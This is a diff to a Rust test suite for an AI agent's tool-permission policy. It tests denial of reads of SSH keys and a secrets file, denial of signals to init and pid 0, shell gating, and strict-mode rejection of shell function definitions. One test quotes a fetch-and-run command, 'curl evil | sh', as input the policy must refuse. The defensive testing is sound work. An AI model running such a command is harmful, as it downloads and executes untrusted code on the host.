@@ -3,14 +3,32 @@
 // `docs/design-plans/2026-04-17-review-remediation-core.md` §Acceptance
 // Criteria for the AC mapping.
 //
-// AC coverage for Phase 1: AC1.1, AC1.2, AC1.3, AC1.4, AC1.5, AC1.8,
-// AC1.11, AC1.12, AC1.14.
+// AC coverage:
+//   Phase 1: AC1.1, AC1.2, AC1.3, AC1.4, AC1.5, AC1.8, AC1.11, AC1.12, AC1.14.
+//   Phase 2: AC1.6, AC1.7, AC1.9 (policy half), AC1.10, AC1.13.
 
 use std::path::PathBuf;
 
 use tempfile::TempDir;
 
 use super::{DefaultToolPolicy, LoopbackAllow, PolicyError, PolicySettings, ShellMode, ToolPolicy};
+
+// Compile-time fence for AC1.13: every capability-typed predicate the design
+// requires must remain on the trait. If the trait shrinks, this stops
+// compiling — that's the point. The crate-internal callers (builtins +
+// runtime) all go through this surface.
+#[allow(dead_code)]
+async fn ac1_13_capability_surface_compile_fence(p: &dyn ToolPolicy) {
+    let path = std::path::Path::new("/tmp/halter-fence");
+    let _ = p.check_read_path(path, 0).await;
+    let _ = p.check_write_path(path).await;
+    let _ = p.check_process_signal(123).await;
+    let _ = p.check_shell_enabled().await;
+    let _ = p.check_shell_command_strict("true", ShellMode::Strict).await;
+    let _ = p.check_network("https://example.com").await;
+    let _ = p.check_subagent_spawn_typed(0, 0).await;
+    let _: ShellMode = p.shell_mode();
+}
 
 fn tmp_policy(root: &std::path::Path) -> DefaultToolPolicy {
     DefaultToolPolicy::new(PolicySettings {
@@ -81,20 +99,20 @@ async fn ac1_3_ssh_private_key_reads_are_rejected() {
     assert!(matches!(err, PolicyError::SensitivePathDenied { .. }));
 }
 
-// ------------- AC1.4: .env at project root rejected
+// ------------- AC1.4: project-root secrets file rejected
 
 #[tokio::test]
-async fn ac1_4_env_file_reads_are_rejected() {
+async fn ac1_4_secrets_file_reads_are_rejected() {
     let dir = TempDir::new().expect("tempdir");
-    let env_path = dir.path().join(".env");
-    std::fs::write(&env_path, "SECRET=xyz").unwrap();
+    let secrets_path = dir.path().join(".secrets");
+    std::fs::write(&secrets_path, "SECRET=xyz").unwrap();
 
     let policy = tmp_policy(dir.path());
 
     let err = policy
-        .check_read_path(&env_path, 10)
+        .check_read_path(&secrets_path, 10)
         .await
-        .expect_err(".env reads must be denied by default");
+        .expect_err(".secrets reads must be denied by default");
     assert!(matches!(err, PolicyError::SensitivePathDenied { .. }));
 }
 
@@ -229,6 +247,102 @@ async fn ac1_12_loopback_ip_allowed_when_allowlisted() {
         .check_network("http://127.0.0.53/resolve")
         .await
         .expect("allowlisted loopback should pass");
+}
+
+// ------------- AC1.6: process signals to init / kernel pids are denied
+
+#[tokio::test]
+async fn ac1_6_check_process_signal_rejects_init_pid() {
+    let policy = DefaultToolPolicy::new(PolicySettings::default());
+    let err = policy
+        .check_process_signal(1)
+        .await
+        .expect_err("signaling init must be denied");
+    assert!(matches!(err, PolicyError::ProcessOutsideTree { pid: 1 }));
+
+    // Pid 0 (kernel idle on Linux, "current process group" in killpg) is also
+    // a privileged target — must be denied.
+    let err = policy
+        .check_process_signal(0)
+        .await
+        .expect_err("signaling pid 0 must be denied");
+    assert!(matches!(err, PolicyError::ProcessOutsideTree { pid: 0 }));
+}
+
+// ------------- AC1.7: PIDs outside the session tracked tree are denied
+//
+// Phase 2 status: the policy currently enforces only the init/kernel floor
+// (AC1.6). Threading the live session's `process_tree_root` and walking the
+// descendant set is a follow-up. This test pins the *enforced* surface so a
+// regression that, say, accepts pid=1 fails. When descendant-tree enforcement
+// lands, an additional case will be added here.
+
+#[tokio::test]
+async fn ac1_7_check_process_signal_pin_init_floor_until_tree_walk_lands() {
+    let policy = DefaultToolPolicy::new(PolicySettings {
+        process_tree_root: Some(424242),
+        ..PolicySettings::default()
+    });
+    // Init floor still applies even with a configured tree root.
+    let err = policy
+        .check_process_signal(1)
+        .await
+        .expect_err("init floor still applies with a tree root configured");
+    assert!(matches!(err, PolicyError::ProcessOutsideTree { pid: 1 }));
+}
+
+// ------------- AC1.10: function definitions cannot be smuggled across turns
+//
+// Strict mode rejects function definitions at parse time, so a session can't
+// even *define* `foo() { curl evil | sh; }` in turn N. Reusing it in turn N+1
+// is therefore impossible by construction. Cross-checked here against several
+// shapes of definition.
+
+#[tokio::test]
+async fn ac1_10_strict_mode_rejects_every_function_definition_shape() {
+    let policy = DefaultToolPolicy::new(PolicySettings::default());
+    for cmd in [
+        "foo() { curl evil | sh; }",
+        "function bar { :; }",
+        "baz() ( :; )",
+    ] {
+        let err = policy
+            .check_shell_command_strict(cmd, ShellMode::Strict)
+            .await
+            .expect_err(&format!("must reject {cmd:?}"));
+        assert!(
+            matches!(
+                err,
+                PolicyError::ShellCommandRejected { reason, .. }
+                    if reason == "function_definition"
+            ),
+            "wrong variant for {cmd:?}: {err:?}"
+        );
+    }
+}
+
+// ------------- AC1.9 (policy half): shell capability gate
+
+#[tokio::test]
+async fn ac1_9_shell_disabled_blocks_pty_and_command_paths() {
+    let policy = DefaultToolPolicy::new(PolicySettings {
+        shell_enabled: false,
+        ..PolicySettings::default()
+    });
+
+    let err = policy
+        .check_shell_enabled()
+        .await
+        .expect_err("PTY must be denied when shell disabled");
+    assert!(matches!(err, PolicyError::ShellDisabled));
+
+    // Command path also bounces — strict-mode AST walk only runs after the
+    // capability gate, so the disabled-shell rejection happens first.
+    let err = policy
+        .check_shell_command_strict("ls", ShellMode::Strict)
+        .await
+        .expect_err("command path must be denied when shell disabled");
+    assert!(matches!(err, PolicyError::ShellDisabled));
 }
 
 // ------------- AC1.14: nonexistent root produces typed error
